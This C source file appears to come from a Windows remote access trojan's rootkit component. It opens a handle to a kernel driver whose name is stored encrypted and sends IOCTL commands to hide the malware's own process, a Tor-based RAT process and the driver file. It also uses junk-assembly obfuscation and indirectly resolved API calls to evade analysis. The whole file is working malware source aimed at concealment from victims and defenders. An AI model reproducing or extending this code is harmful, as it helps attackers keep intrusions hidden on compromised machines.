#include <windows.h>

#include "kernel_driver_functions.h"
#include "process.h"
#include "crypto.h"
#include "functions_table.h"

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include "junk_asm.h"

#include "common_utils.h"

#include "debug.h"

#pragma warning(disable:4996)

// TODO: encrypt this constant


extern DWORD TOR_PROCESS_ID;


static int set_device_handle(HANDLE* p_handle) {
	ASM_JUNK

		char* driver_device_path = NULL;
	decrypt_to_string(&driver_device_path, DRIVER_DEVICE_NAME, DRIVER_DEVICE_NAME_LEN);

	DBG_MSG("set_device_handle() - driver_device_path: %s\n", driver_device_path);

	//
	DBG_MSG("set_device_handle() - openning handle to: %s\n", driver_device_path);

	//
	*p_handle = l_CreateFileA(
		driver_device_path,
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);


	if (p_handle == INVALID_HANDLE_VALUE) {
		DBG_MSG("set_device_handle() - openning handle to: %s failed.\n", driver_device_path);

		free(driver_device_path);
		return ERROR_INVALID_HANDLE;
	}

	free(driver_device_path);
	return ERROR_SUCCESS;
}

static int do_driver_operation(HANDLE h_device_file, DWORD command) {
	ASM_JUNK

		bool op_status = TRUE;
	char* input_buffer;
	char* output_buffer;

	DWORD n_buffer_size = 32;
	DWORD bytes_read = 0;

	input_buffer = (char*)calloc(n_buffer_size, 1);
	output_buffer = (char*)calloc(n_buffer_size, 1);

	if ((input_buffer == NULL) || (output_buffer == NULL)) {
		DBG_MSG("do_driver_operation() - Could not allocate memory.\n");
		return 1;
	}

	//
	switch (command) {
	case IOCTL_HIDE_PROCESS_CMD: {
		char process_id[50];

		itoa(l_GetCurrentProcessId(), process_id, 10);
		strcpy(input_buffer, process_id);

		DBG_MSG("do_driver_operation() - sending command code: 0x%x\n", command);
		DBG_MSG("do_driver_operation() - input_buffer: %s\n", input_buffer);
	}
							   break;

	case IOCTL_HIDE_RAT_PROCESS_CMD: {
		char process_id[50];

		itoa(TOR_PROCESS_ID, process_id, 10);
		strcpy(input_buffer, process_id);

		DBG_MSG("do_driver_operation() - sending command code: 0x%x\n", command);
		DBG_MSG("do_driver_operation() - input_buffer: %s\n", input_buffer);
	}
								   break;

	case IOCTL_HIDE_DRIVER_CMD: {
		char* driver_install_filename_decrypted = NULL;
		decrypt_to_string(&driver_install_filename_decrypted, DRIVER_INSTALL_FILENAME, DRIVER_INSTALL_FILENAME_ENCRYPTED_LEN);

		strcpy(input_buffer, driver_install_filename_decrypted);

		DBG_MSG("do_driver_operation() - sending command code: 0x%x\n", command);
		DBG_MSG("do_driver_operation() - input_buffer: %s\n", input_buffer);

		free(driver_install_filename_decrypted);
	}
							  break;

	default:
		DBG_MSG("do_driver_operation() - CMD not recognized.\n");
		return 1;
	}

	//
	op_status = l_DeviceIoControl(
		h_device_file,
		(DWORD)command,
		(LPVOID)input_buffer,
		n_buffer_size,
		(LPVOID)output_buffer,
		n_buffer_size,
		&bytes_read,
		NULL
	);

	if (op_status == FALSE) {
		DBG_MSG("do_driver_operation() - DeviceIoControl() failed.\n");
	}

	DBG_MSG("do_driver_operation() - bytes_read: %d\n", bytes_read);
	DBG_MSG("do_driver_operation() - output_buffer: %s\n", output_buffer);

	free(input_buffer);
	free(output_buffer);

	return ERROR_SUCCESS;
}


int send_driver_commands() {
	ASM_JUNK

		int ret_code = ERROR_SUCCESS;

	HANDLE h_device_file = INVALID_HANDLE_VALUE;

	ret_code = set_device_handle(&h_device_file);

	if (ret_code != ERROR_SUCCESS) {
		return ret_code;
	}

	do_driver_operation(h_device_file, (DWORD)IOCTL_HIDE_PROCESS_CMD);

	if (TOR_PROCESS_ID != 0) {
		do_driver_operation(h_device_file, (DWORD)IOCTL_HIDE_RAT_PROCESS_CMD);
	}

	do_driver_operation(h_device_file, (DWORD)IOCTL_HIDE_DRIVER_CMD);

	return ERROR_SUCCESS;
}